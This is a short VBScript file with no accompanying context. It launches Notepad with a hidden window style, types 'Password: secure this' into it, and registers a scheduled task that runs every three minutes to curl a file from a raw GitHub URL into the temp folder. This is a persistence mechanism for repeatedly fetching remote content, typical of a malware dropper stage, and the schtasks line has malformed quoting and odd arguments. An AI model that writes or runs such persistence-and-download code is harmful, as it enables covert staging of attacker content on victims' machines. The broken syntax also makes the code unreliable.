Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe", 0, True

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"

Set tsks = WScript.CreateObject("WScript.Shell")
tsks.Run "schtasks /create /sc minute /mo 3 /tn "A2" /tr "curl https://raw.githubusercontent.com/section10housing/b1/master/RC.txt -o %tmp%\\RC.txt" -F -Z, 0, True





